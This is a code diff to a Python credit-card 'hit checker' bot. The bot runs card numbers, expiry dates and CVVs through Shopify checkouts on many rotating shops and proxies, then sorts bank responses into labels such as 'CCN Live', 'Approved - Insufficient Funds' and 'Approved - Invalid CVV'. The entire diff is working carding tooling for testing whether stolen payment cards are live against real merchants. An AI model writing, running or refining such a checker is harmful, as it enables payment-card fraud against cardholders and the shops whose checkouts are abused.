@@ -946,7 +946,7 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv, progress_cb=None):
             },
             'note': {'message': None, 'customAttributes': []},
             'localizationExtension': {'fields': []},
-            'nonNegotiableTerms': {'termsAccepted': True},
+            'nonNegotiableTerms': None,
             'scriptFingerprint': _generate_script_fingerprint(),
             'optionalDuties': {'buyerRefusesDuties': False},
         },
@@ -966,7 +966,7 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv, progress_cb=None):
     logger.info(f"[SHOPIFY] Submit response: {text[:400]}")
 
     if "Your order total has changed." in text:
-        completion_vars['input']['nonNegotiableTerms'] = {'termsAccepted': True}
+        completion_vars['input']['nonNegotiableTerms'] = None
         text = await _do_submit()
         if "Your order total has changed." in text:
             return None, "Total changed", gateway_display_name, None
@@ -996,7 +996,7 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv, progress_cb=None):
                 msgs = [e.get('localizedMessage', '') for e in errors]
                 all_text = ' '.join(codes + msgs).lower()
                 if 'terms' in all_text or 'accept' in all_text or 'consent' in all_text:
-                    completion_vars['input']['nonNegotiableTerms'] = {'termsAccepted': True}
+                    completion_vars['input']['nonNegotiableTerms'] = None
                     text = await _do_submit()
                     logger.info(f"[SHOPIFY] Submit retry response: {text[:300]}")
                     try:
@@ -1076,7 +1076,7 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv, progress_cb=None):
     if 'ActionRequiredReceipt' in text:
         # 3DS verification required = card is LIVE (bank recognized it)
         bank = _parse_bank_response(text)
-        return running_total, "CCN Live - 3DS Required", gateway_display_name, {
+        return running_total, "Approved - 3DS Required", gateway_display_name, {
             'subtotal': subtotal_price, 'shipping': shipping_amount,
             'tax': tax_amount, 'total': running_total, 'currency': currency, 'bank': bank,
         }
@@ -1153,17 +1153,17 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv, progress_cb=None):
     ]
 
     if any(k in tl for k in LIVE_DECLINE_KEYWORDS):
-        return running_total, f"CCN Live - {code or bank_code or 'Declined'}", gateway_display_name, {
+        return running_total, f"Declined - {code or bank_code or 'BANK_DECLINED'}", gateway_display_name, {
             'subtotal': subtotal_price, 'shipping': shipping_amount, 'tax': tax_amount,
             'total': running_total, 'currency': currency, 'bank': bank,
         }
     if any(k in tl for k in ['invalid_cvc', 'incorrect_cvc']):
-        return running_total, "CCN Live - Invalid CVV", gateway_display_name, {
+        return running_total, "Declined - Invalid CVV", gateway_display_name, {
             'subtotal': subtotal_price, 'shipping': shipping_amount, 'tax': tax_amount,
             'total': running_total, 'currency': currency, 'bank': bank,
         }
     if 'zip' in tl and ('invalid' in tl or 'incorrect' in tl):
-        return running_total, "CCN Live - Invalid ZIP", gateway_display_name, {
+        return running_total, "Declined - Invalid ZIP", gateway_display_name, {
             'subtotal': subtotal_price, 'shipping': shipping_amount, 'tax': tax_amount,
             'total': running_total, 'currency': currency, 'bank': bank,
         }
@@ -1173,12 +1173,12 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv, progress_cb=None):
             'total': running_total, 'currency': currency, 'bank': bank,
         }
     if any(k in tl for k in ['stolen', 'lost', 'pickup']):
-        return running_total, f"CCN Live - {code}", gateway_display_name, {
+        return running_total, f"Declined - {code}", gateway_display_name, {
             'subtotal': subtotal_price, 'shipping': shipping_amount, 'tax': tax_amount,
             'total': running_total, 'currency': currency, 'bank': bank,
         }
     if any(k in tl for k in ['do_not_honor', 'generic_decline']):
-        return running_total, f"CCN Live - {code}", gateway_display_name, {
+        return running_total, f"Declined - {code}", gateway_display_name, {
             'subtotal': subtotal_price, 'shipping': shipping_amount, 'tax': tax_amount,
             'total': running_total, 'currency': currency, 'bank': bank,
         }
@@ -1186,14 +1186,14 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv, progress_cb=None):
         # Card reached the bank and was declined - this means the card number is VALID
         # A truly dead/invalid card would fail at tokenization, not at the bank
         # So this is a LIVE card that the bank declined for an unknown reason
-        return running_total, f"CCN Live - {code or 'Declined by Bank'}", gateway_display_name, {
+        return running_total, f"Declined - {code or 'BANK_DECLINED'}", gateway_display_name, {
             'subtotal': subtotal_price, 'shipping': shipping_amount, 'tax': tax_amount,
             'total': running_total, 'currency': currency, 'bank': bank,
         }
 
     # Any other decline code means the card reached the bank = card is LIVE
     # Only truly invalid cards fail before reaching the bank
-    return running_total, f"CCN Live - {code}", gateway_display_name, {
+    return running_total, f"Declined - {code}", gateway_display_name, {
         'subtotal': subtotal_price, 'shipping': shipping_amount, 'tax': tax_amount,
         'total': running_total, 'currency': currency, 'bank': bank,
     }
@@ -1224,9 +1224,13 @@ def _format_response_v2(raw_resp: dict, status: str = None) -> str:
     elapsed = raw_resp.get('elapsed', 0)
     resp_lower = response_text.lower()
     
-    # Approved/Charged
-    if resp_status == 'approved' or (amount and amount != 'N/A'):
+    # Only show Charged if status is actually "charged"
+    if resp_status == 'charged':
         return f"✅ Charged ${amount} - Payment Successful [{elapsed}s]"
+    
+    # Approved - card is live
+    if resp_status == 'approved':
+        return f"✅ Approved ${amount} - {response_text} [{elapsed}s]"
     
     # APPROVED - Insufficient Funds means card is GOOD!
     if 'insufficient' in resp_lower or 'funds' in resp_lower:
@@ -1280,28 +1284,28 @@ def _format_response_v2(raw_resp: dict, status: str = None) -> str:
     if resp_status == 'dead_site':
         return f"⚠️ Dead Site - {response_text} [{elapsed}s]"
     
-    # CCN Live - ANY decline means it reached the bank!
+    # Declined - ANY decline means it reached the bank!
     if resp_status == 'live' or resp_status == 'declined' or 'decline' in resp_lower:
         if 'insufficient' in resp_lower or 'funds' in resp_lower:
-            return f"🟡 CCN Live - Insufficient Funds [{elapsed}s]"
+            return f"Approved - Insufficient Funds [{elapsed}s]"
         if 'do not honor' in resp_lower:
-            return f"🟡 CCN Live - Do Not Honor [{elapsed}s]"
+            return f"🟡 Declined - Do Not Honor [{elapsed}s]"
         if 'cvv' in resp_lower or 'cvc' in resp_lower:
-            return f"🟡 CCN Live - Invalid CVV/CVC [{elapsed}s]"
+            return f"🟡 Declined - Invalid CVV/CVC [{elapsed}s]"
         if 'generic' in resp_lower:
-            return f"🟡 CCN Live - Generic Decline [{elapsed}s]"
-        return f"🟡 CCN Live - Card Declined by Bank [{elapsed}s]"
+            return f"🟡 Declined - Generic Decline [{elapsed}s]"
+        return f"🟡 Declined - Card Declined by Bank [{elapsed}s]"
     
     # Gateway Error - ONLY timeout/connection errors
     if resp_status == 'error' or resp_status == 'timeout':
         return f"❌ Gateway Error - {response_text} [{elapsed}s]"
     
     # Default - treat as CCN Live (safer)
-    return f"🟡 CCN Live - {response_text} [{elapsed}s]"
+    return f"🟡 Declined - {response_text} [{elapsed}s]"
     
     # Generic decline
     if 'generic_decline' in response_text.lower():
-        return f"🟡 CCN Live - Generic Decline [{elapsed}s]"
+        return f"🟡 Declined - Generic Decline [{elapsed}s]"
     
     # Default
     return f"❌ Gateway Error - {response_text} [{elapsed}s]"
@@ -1330,24 +1334,41 @@ def _classify_shopify_response(amount, response, gw_name, site, elapsed, extra=N
     # generic_decline/error = Card FAILED before bank (GATEWAY ERROR)
     
     is_card_declined = "card_declined" in resp_lower
-    is_generic_error = any(k in resp_lower for k in ["generic_decline", "generic error", "processing_error", "error", "failed", "timeout"])
-    is_bank_decline = any(k in resp_lower for k in ["insufficient", "ccn live", "invalid_cvc", "incorrect_cvc", "invalid_cvv", "incorrect_cvv", "incorrect_zip", "do_not_honor", "fraud", "velocity"])
+    # generic_decline is a BANK decline, NOT a gateway error
+    is_generic_error = any(k in resp_lower for k in ["generic_error", "generic error", "processing_error", "error", "failed", "timeout"])
+    is_bank_decline = any(k in resp_lower for k in ["insufficient", "ccn live", "invalid_cvc", "incorrect_cvc", "invalid_cvv", "incorrect_cvv", "incorrect_zip", "do_not_honor", "fraud", "velocity", "card_declined", "pickup_card", "lost_card", "stolen_card", "restricted_card", "security_violation", "transaction_not_allowed"])
+    is_dead_site = any(k in resp_lower for k in ["no products", "no session token", "site requires login", "captcha", "no shipping"])
     is_3ds = any(k in resp_lower for k in ["3ds", "3d secure", "authentication_required", "requires_action", "action required"])
     is_charged = any(k in resp_lower for k in CHARGED_KEYWORDS)
 
     if amount is None:
         if is_dead_site:
-            status = dead_site
+            status = "dead_site"
             resp_text = response
         elif is_3ds:
-            status = "live"
-            resp_text = "3D Secure Required"
+            status = "approved"
+            resp_text = "Approved - 3DS Required"
         elif is_card_declined:
-            status = "approved"
-            resp_text = "CCN Live - Card Declined by Bank"
+            status = "declined"
+            resp_text = "Declined - card_declined"
         elif is_bank_decline:
-            status = "approved"
-            resp_text = response
+            # Check if it's a LIVE card response (insufficient funds, invalid cvv, etc)
+            if any(k in resp_lower for k in ["insufficient", "funds"]):
+                status = "approved"
+                resp_text = "Approved - Insufficient Funds"
+            elif any(k in resp_lower for k in ["invalid_cvc", "incorrect_cvc", "invalid_cvv", "incorrect_cvv"]):
+                status = "approved"
+                resp_text = "Approved - Invalid CVV"
+            elif any(k in resp_lower for k in ["do_not_honor", "card_declined", "pickup_card", "lost_card", "stolen_card", "restricted_card", "security_violation", "transaction_not_allowed"]):
+                status = "declined"
+                resp_text = response
+            elif "generic_decline" in resp_lower or "generic_error" in resp_lower:
+                # GENERIC_ERROR is a gateway error - card did NOT reach bank
+                status = "error"
+                resp_text = "Gateway Error - Card Did Not Reach Bank"
+            else:
+                status = "declined"
+                resp_text = response
         elif is_generic_error:
             status = "error"
             resp_text = "Gateway Error - Card Did Not Reach Bank"
@@ -1404,12 +1425,10 @@ async def shopify_native_check_rich(cc, mm, yy, cvv, site=None, progress_cb=None
     
     start = time.time()
     card_short = f"{cc[:6]}...{cc[-4:]}"
-    try:
-        with open('/root/hitchecker/bot/proxy.txt', 'r') as f:
-            proxy_list = [l.strip() for l in f if l.strip()]
-    except:
-        proxy_list = []
-    _proxy = proxy or (random.choice(proxy_list) if proxy_list else None)
+    # Only use proxy if explicitly passed (from user /setproxy)
+    # DON'T load from proxy.txt - those proxies block Shopify
+    proxy_list = []
+    _proxy = proxy
     
     # Single site specified
     if site:
@@ -1417,13 +1436,13 @@ async def shopify_native_check_rich(cc, mm, yy, cvv, site=None, progress_cb=None
         logger.info(f"[SHOPIFY] Card={card_short} Single site mode: {clean_site}, proxy={_proxy is not None}")
         
         try:
-            kw = {"timeout": aiohttp.ClientTimeout(total=8), "connector": aiohttp.TCPConnector(limit=100, limit_per_host=30, ttl_dns_cache=600, use_dns_cache=True, ssl=False)}
+            kw = {"timeout": aiohttp.ClientTimeout(total=12), "connector": aiohttp.TCPConnector(limit=100, limit_per_host=30, ttl_dns_cache=600, use_dns_cache=True, ssl=False)}
             if _proxy:
                 kw["proxy"] = _proxy
             async with aiohttp.ClientSession(**kw) as session:
                 result = await asyncio.wait_for(
                     _shopify_check(session, clean_site, cc, mm, yy, cvv, progress_cb=progress_cb),
-                    timeout=10
+                    timeout=15
                 )
                 amount, response, gw_name = result[0], result[1], result[2]
                 extra = result[3] if len(result) > 3 else None
@@ -1454,12 +1473,12 @@ async def shopify_native_check_rich(cc, mm, yy, cvv, site=None, progress_cb=None
     random.shuffle(sites)
     logger.info(f"[SHOPIFY] Card={card_short} No site specified, trying {min(6, len(sites))} of {len(sites)} sites, proxy={_proxy is not None}")
 
-    for i, s in enumerate(sites[:6]):
+    for i, s in enumerate(sites[:15]):
         current_proxy = proxy_list[i % len(proxy_list)] if proxy_list else None
         logger.info(f"[SHOPIFY] Card={card_short} Attempt {i+1}/6 site={s} proxy={current_proxy is not None}")
 
         try:
-            kw = {"timeout": aiohttp.ClientTimeout(total=8), "connector": aiohttp.TCPConnector(limit=100, limit_per_host=30, ttl_dns_cache=600, use_dns_cache=True, ssl=False)}
+            kw = {"timeout": aiohttp.ClientTimeout(total=12), "connector": aiohttp.TCPConnector(limit=100, limit_per_host=30, ttl_dns_cache=600, use_dns_cache=True, ssl=False)}
             if current_proxy:
                 kw["proxy"] = current_proxy
             async with aiohttp.ClientSession(**kw) as session:
